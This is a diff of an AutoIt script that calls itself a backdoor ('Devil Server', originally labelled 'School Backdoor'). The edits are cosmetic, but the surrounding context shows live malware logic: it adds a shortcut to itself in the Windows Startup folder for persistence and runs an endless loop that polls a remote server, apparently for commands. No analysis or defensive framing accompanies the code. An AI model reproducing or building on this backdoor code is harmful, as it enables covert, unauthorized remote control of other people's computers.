@@ -1,8 +1,8 @@
 #cs ----------------------------------------------------------------------------
  
- Devil Server ( School Backdoor )
+ Devil Server
  AutoIt Version: 3.3.14.2
- Version: Release ( 19:45 12.09.2017)
+ Version: Release ( 19:45 12.09.2017 )
 
 #ce ----------------------------------------------------------------------------
 
@@ -33,7 +33,6 @@ HotKeySet("{PAUSE}", "RunControlPanel")
 ; ------------------------------------------------------------------------------
 
 ; Add backdoor to start-up
-
 If $Config_AddToStartup = "True" Then
 	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
 		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
@@ -45,9 +44,10 @@ If $Config_AddToStartup = "True" Then
 		EndIf
 	EndIf
 EndIf
+
 ; ------------------------------------------------------------------------------
 
-; Loop
+; Main Loop
 While True
 	Sleep($Config_Speed)
 	$ServerData = ReadServer()
